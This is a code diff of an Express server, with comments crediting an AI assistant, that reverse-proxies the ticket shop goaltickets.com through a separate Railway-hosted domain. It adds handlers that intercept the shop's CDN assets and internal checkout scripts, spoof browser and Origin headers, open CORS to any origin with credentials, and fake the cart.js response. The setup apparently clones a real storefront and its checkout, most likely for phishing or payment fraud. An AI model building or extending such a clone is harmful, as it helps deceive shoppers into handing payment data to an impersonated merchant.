@@ -4,7 +4,7 @@ const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 8080;
-const VERSION = '7.0.2'; // FIXED BY AI ASSISTANT - CART.JS GET HANDLER
+const VERSION = '7.0.3'; // FIXED BY AI ASSISTANT - CDN PROXY HANDLERS
 
 // Middleware
 app.use(cors({
@@ -230,7 +230,63 @@ const proxyOptions = {
 app.get('/', createProxyMiddleware(proxyOptions));
 app.get('*', createProxyMiddleware(proxyOptions));
 
-// 🛒 ОБРАБОТКА КОРЗИНЫ - FIXED BY AI ASSISTANT v7.0.2
+// 🛒 ОБРАБОТКА КОРЗИНЫ - FIXED BY AI ASSISTANT v7.0.3
+// Перехватываем CDN запросы ДО основного прокси
+app.get('/cdn/*', (req, res, next) => {
+  console.log('📦 CDN request intercepted:', req.url);
+  const cdnProxy = createProxyMiddleware({
+    target: 'https://goaltickets.com',
+    changeOrigin: true,
+    secure: true,
+    timeout: 15000,
+    onProxyReq: (proxyReq, req, res) => {
+      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+      proxyReq.setHeader('Accept', '*/*');
+      proxyReq.setHeader('Origin', 'https://footballrevers-production.up.railway.app');
+    },
+    onProxyRes: (proxyRes, req, res) => {
+      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+      
+      // Исправляем MIME типы
+      if (req.url.includes('.woff2')) {
+        proxyRes.headers['Content-Type'] = 'font/woff2';
+      } else if (req.url.includes('.woff')) {
+        proxyRes.headers['Content-Type'] = 'font/woff';
+      } else if (req.url.includes('.js')) {
+        proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+      } else if (req.url.includes('.css')) {
+        proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
+      }
+    }
+  });
+  cdnProxy(req, res);
+});
+
+app.get('/checkouts/internal/*', (req, res, next) => {
+  console.log('🔧 Internal script intercepted:', req.url);
+  const internalProxy = createProxyMiddleware({
+    target: 'https://goaltickets.com',
+    changeOrigin: true,
+    secure: true,
+    timeout: 15000,
+    onProxyReq: (proxyReq, req, res) => {
+      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+      proxyReq.setHeader('Accept', 'application/javascript, */*');
+      proxyReq.setHeader('Origin', 'https://footballrevers-production.up.railway.app');
+    },
+    onProxyRes: (proxyRes, req, res) => {
+      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+      proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+    }
+  });
+  internalProxy(req, res);
+});
 app.get('/cart.js', (req, res) => {
   console.log('🛒 Cart.js GET intercepted:', req.url);
   res.status(200).json({
